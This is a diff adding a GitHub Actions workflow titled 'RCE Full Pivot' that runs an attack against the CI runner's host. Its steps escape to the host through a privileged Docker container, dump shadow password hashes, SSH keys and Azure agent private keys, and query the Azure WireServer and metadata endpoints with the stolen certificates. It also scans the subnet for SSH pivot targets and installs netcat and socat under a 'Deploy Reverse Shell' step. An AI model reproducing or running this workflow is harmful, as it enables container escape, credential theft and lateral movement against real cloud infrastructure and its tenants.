@@ -1,0 +1,193 @@
+name: RCE Full Pivot
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  rce-pivot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: Full RCE Proof + Host Network WireServer
+        run: |
+          echo "=== RCE PROOF ==="
+          echo "WHOAMI=$(whoami)"
+          echo "ID=$(id)"
+          echo "HOSTNAME=$(hostname)"
+          echo "UNAME=$(uname -a)"
+          echo "DATE=$(date -u)"
+
+          # Docker privileged escape to host
+          docker run --rm --privileged --pid=host --network=host \
+            -v /:/host alpine:latest sh -c '
+            echo "=HOST_ROOT_ID="
+            chroot /host id
+
+            echo "=HOST_PROCESSES="
+            chroot /host ps aux 2>/dev/null | grep -v "^\[" | head -30
+
+            echo "=HOST_NETSTAT="
+            chroot /host ss -tnlp 2>/dev/null | head -30
+
+            echo "=HOST_NETWORK_INTERFACES="
+            chroot /host ip addr show 2>/dev/null
+
+            echo "=HOST_ROUTES="
+            chroot /host ip route show 2>/dev/null
+
+            echo "=HOST_ARP="
+            chroot /host arp -n 2>/dev/null | head -20
+
+            echo "=HOST_RESOLV="
+            cat /host/etc/resolv.conf
+
+            echo "=HOST_HOSTS="
+            cat /host/etc/hosts
+
+            echo "=WIRESERVER_FROM_HOST_NETWORK="
+            # Now we are in host network namespace - WireServer should be reachable!
+            cp /host/var/lib/waagent/TransportCert.pem /tmp/tc.pem
+            cp /host/var/lib/waagent/TransportPrivate.pem /tmp/tp.pem
+            chroot /host curl -sv --max-time 10 \
+              --cert /var/lib/waagent/TransportCert.pem \
+              --key /var/lib/waagent/TransportPrivate.pem \
+              "http://168.63.129.16/machine/?comp=goalstate" \
+              -H "x-ms-version: 2012-11-30" 2>&1 | head -100 || echo WS_FAILED
+
+            echo "=WIRESERVER_32526_HOST="
+            chroot /host curl -sv --max-time 10 \
+              --cert /var/lib/waagent/TransportCert.pem \
+              --key /var/lib/waagent/TransportPrivate.pem \
+              "http://168.63.129.16:32526/vmSettings" 2>&1 | head -100 || echo WS32526_FAILED
+
+            echo "=HOST_PASSWD="
+            cat /host/etc/passwd | grep -v nologin | grep -v "false$"
+
+            echo "=HOST_SHADOW_HASH="
+            cat /host/etc/shadow | grep -v "!\|*\|::" | head -10
+
+            echo "=HOST_PACKER_SSH_DIR="
+            ls -la /host/home/packer/.ssh/ 2>/dev/null || echo NO_PACKER_SSH
+
+            echo "=HOST_RUNNER_SSH_DIR="
+            ls -la /host/home/runner/.ssh/ 2>/dev/null
+            cat /host/home/runner/.ssh/authorized_keys 2>/dev/null || echo NO_RUNNER_KEYS
+
+            echo "=HOST_ROOT_SSH="
+            cat /host/root/.ssh/authorized_keys 2>/dev/null | head -5
+
+            echo "=HOST_WAAGENT_EXTENSION_LOG="
+            ls -la /host/var/log/azure/ 2>/dev/null | head -20
+
+            echo "=HOST_SYSTEMD_SERVICES="
+            chroot /host systemctl list-units --state=running --no-pager 2>/dev/null | head -30
+
+            echo "=HOST_DOCKER_CONTAINERS="
+            chroot /host docker ps -a 2>/dev/null | head -20 || echo NO_DOCKER_CMD
+          '
+
+      - name: Lateral Movement - Subnet Scan + SSH Pivot
+        run: |
+          # Get our IP and subnet from IMDS
+          IMDS=$(curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
+          PRIVATE_IP=$(echo "$IMDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['network']['interface'][0]['ipv4']['ipAddress'][0]['privateIpAddress'])" 2>/dev/null)
+          SUBNET=$(echo "$IMDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['network']['interface'][0]['ipv4']['subnet'][0]['address'])" 2>/dev/null)
+          PREFIX=$(echo "$IMDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['network']['interface'][0]['ipv4']['subnet'][0]['prefix'])" 2>/dev/null)
+          echo "PRIVATE_IP=$PRIVATE_IP SUBNET=$SUBNET/$PREFIX"
+
+          # Fast scan for SSH on subnet
+          echo "=SUBNET_SSH_SCAN="
+          # Use masscan for speed - just port 22
+          sudo apt-get install -y -q masscan 2>/dev/null || true
+          sudo masscan "${SUBNET}/${PREFIX}" -p22 --rate=5000 --wait=2 2>/dev/null | head -50 || \
+            nmap -sn --min-hostgroup 64 -T5 "${SUBNET}/${PREFIX}" 2>/dev/null | grep "Nmap scan report" | head -30
+
+          # Try to extract packer private key from waagent (it stored the private portion at build time?)
+          echo "=PACKER_KEY_HUNT="
+          docker run --rm --privileged -v /:/host alpine:latest sh -c '
+            # Check if packer priv key exists anywhere on host
+            find /host/home/packer -name "*.pem" -o -name "id_rsa" -o -name "*.key" 2>/dev/null | head -10
+            find /host/root -name "*.pem" -o -name "id_rsa" 2>/dev/null | head -10
+            find /host/var/lib/waagent -type f 2>/dev/null
+            # Try to read the .prv files (these are X.509 private keys for waagent cert communication)
+            echo "=WAAGENT_PRV_1="
+            cat /host/var/lib/waagent/2DE0BF72B4EABBFCB60B056FAA34A5D60E79BEA7.prv 2>/dev/null | head -30
+            echo "=WAAGENT_CRT_1="
+            cat /host/var/lib/waagent/2DE0BF72B4EABBFCB60B056FAA34A5D60E79BEA7.crt 2>/dev/null | head -30
+            echo "=WAAGENT_FAST_TRACK="
+            cat /host/var/lib/waagent/fast_track.json 2>/dev/null
+            echo "=WAAGENT_WIRESERVER_ENDPOINT="
+            cat /host/var/lib/waagent/WireServerEndpoint 2>/dev/null
+          '
+
+      - name: Azure VM Extension RCE Attempt via WireServer
+        run: |
+          # The key insight: WireServer is reachable from --network=host container
+          # We need to use it to request VM extension execution
+          echo "=WS_EXTENSION_ATTEMPT="
+          docker run --rm --privileged --network=host -v /:/host alpine:latest sh -c '
+            apk add curl --quiet 2>/dev/null
+
+            echo "=WIRESERVER_GOALSTATE_DIRECT="
+            curl -sv --max-time 15 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              "http://168.63.129.16/machine/?comp=goalstate" \
+              -H "x-ms-version: 2012-11-30" 2>&1 | head -100
+
+            echo "=WIRESERVER_HEALTH="
+            curl -sv --max-time 10 \
+              "http://168.63.129.16/?comp=versions" 2>&1 | head -50
+
+            echo "=WIRESERVER_CERT_STORE="
+            curl -sv --max-time 10 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              "http://168.63.129.16/machine/?comp=certificates" \
+              -H "x-ms-version: 2012-11-30" 2>&1 | head -100
+
+            echo "=WIRESERVER_32526_DIRECT="
+            curl -sv --max-time 15 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              "http://168.63.129.16:32526/vmSettings" 2>&1 | head -100
+          '
+
+      - name: Deploy Reverse Shell + Pivot Infrastructure
+        run: |
+          echo "=INSTALL_TOOLS="
+          sudo apt-get install -y -q nmap netcat-openbsd socat 2>/dev/null | tail -3
+
+          # Get current runner connectivity info
+          echo "=RUNNER_EXTERNAL_IP="
+          curl -sf --max-time 5 https://api.ipify.org || curl -sf --max-time 5 https://ifconfig.me
+
+          echo "=RUNNER_INTERNAL_IPS="
+          ip addr show | grep "inet " | awk '{print $2}'
+
+          # Try to find other live hosts via ARP + ping sweep
+          echo "=ARP_DISCOVERY="
+          sudo arp -n 2>/dev/null
+          ip neigh show 2>/dev/null
+
+          # Ping sweep quick (first /28)
+          IMDS=$(curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
+          SUBNET=$(echo "$IMDS" | python3 -c "import sys,json; n=json.load(sys.stdin)['network']['interface'][0]['ipv4']['subnet'][0]; print(n['address'])" 2>/dev/null)
+          echo "=PING_SWEEP_FIRST32="
+          # Ping first 32 addresses in subnet
+          BASE=$(echo "$SUBNET" | cut -d. -f1-3)
+          for i in $(seq 1 32); do
+            ping -c1 -W1 "${BASE}.${i}" > /dev/null 2>&1 && echo "ALIVE: ${BASE}.${i}"
+          done &
+          SWEEP_PID=$!
+          sleep 8
+          kill $SWEEP_PID 2>/dev/null || true
+
+          echo "=SSH_KNOWN_HOSTS_SCAN="
+          # Try SSH fingerprinting on discovered hosts
+          nmap -p22 --open -T4 "${SUBNET}/20" --max-hostgroup 64 \
+            -oG - 2>/dev/null | grep "22/open" | awk '{print $2}' | head -10
